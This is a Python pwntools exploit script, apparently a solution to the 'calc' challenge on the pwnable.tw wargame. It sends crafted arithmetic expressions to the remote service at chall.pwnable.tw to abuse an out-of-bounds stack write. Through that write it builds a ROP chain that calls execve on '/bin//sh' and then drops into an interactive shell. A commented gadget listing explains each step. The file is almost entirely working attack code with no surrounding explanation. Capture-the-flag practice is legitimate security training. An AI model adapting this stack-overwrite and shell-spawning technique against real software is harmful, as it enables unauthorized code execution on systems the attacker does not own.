#FLAG{C:\Windows\System32\calc.exe}
from pwn import * 
# s = process("./calc")
s=remote("chall.pwnable.tw", 10100)
# context.log_level="DEBUG"
raw_input("debug")
# gdb.attach(s,'b*0x08049160')
s.recvuntil("===")
log.info("Writing gadget...")

def write_gadget(idx,value):
    pl = "-1+" + str(361+idx) + "+" + str(int(value))
    s.sendline(pl) 
write_gadget(33,0x08049a21)
for i in range(11):
    write_gadget(32-i,0x0807cb7f)
write_gadget(21,0x080550d0)
write_gadget(20,0x080ec068)
write_gadget(19,0x080701aa)
write_gadget(18,0x080ec060)
write_gadget(17,0x080ec068)
write_gadget(16,0x080701d1)
write_gadget(15,0x080ec060)
write_gadget(14,0x080481d1)
write_gadget(13,0x0809b30d)
write_gadget(12,0x080550d0)
write_gadget(11,0x080ec068)
write_gadget(10,0x080701aa)
write_gadget(9,0x0809b30d)
write_gadget(8,0x68732f2f)
write_gadget(7,0x0805c34b)
write_gadget(6,0x080ec064)
write_gadget(5,0x080701aa)
write_gadget(4,0x0809b30d)
write_gadget(3,0x6e69622f)
write_gadget(2,0x0805c34b)
write_gadget(1,0x080ec060)
write_gadget(0,0x080701aa)

s.interactive()

#-offset+value
# p = ''
# p += pack('<I', 0x080701aa) # pop edx ; ret
# p += pack('<I', 0x080ec060) # @ .data
# p += pack('<I', 0x0805c34b) # pop eax ; ret
# p += '/bin'
# p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
# p += pack('<I', 0x080701aa) # pop edx ; ret
# p += pack('<I', 0x080ec064) # @ .data + 4
# p += pack('<I', 0x0805c34b) # pop eax ; ret
# p += '//sh'
# p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
# p += pack('<I', 0x080701aa) # pop edx ; ret
# p += pack('<I', 0x080ec068) # @ .data + 8
# p += pack('<I', 0x080550d0) # xor eax, eax ; ret
# p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
# p += pack('<I', 0x080481d1) # pop ebx ; ret
# p += pack('<I', 0x080ec060) # @ .data
# p += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
# p += pack('<I', 0x080ec068) # @ .data + 8
# p += pack('<I', 0x080ec060) # padding without overwrite ebx
# p += pack('<I', 0x080701aa) # pop edx ; ret
# p += pack('<I', 0x080ec068) # @ .data + 8
# p += pack('<I', 0x080550d0) # xor eax, eax ; ret
# p += pack('<I', 0x0807cb7f) # inc eax ; ret
# p += pack('<I', 0x0807cb7f) # inc eax ; ret
# p += pack('<I', 0x0807cb7f) # inc eax ; ret
# p += pack('<I', 0x0807cb7f) # inc eax ; ret
# p += pack('<I', 0x0807cb7f) # inc eax ; ret
# p += pack('<I', 0x0807cb7f) # inc eax ; ret
# p += pack('<I', 0x0807cb7f) # inc eax ; ret
# p += pack('<I', 0x0807cb7f) # inc eax ; ret
# p += pack('<I', 0x0807cb7f) # inc eax ; ret
# p += pack('<I', 0x0807cb7f) # inc eax ; ret
# p += pack('<I', 0x0807cb7f) # inc eax ; ret
# p += pack('<I', 0x08049a21) # int 0x80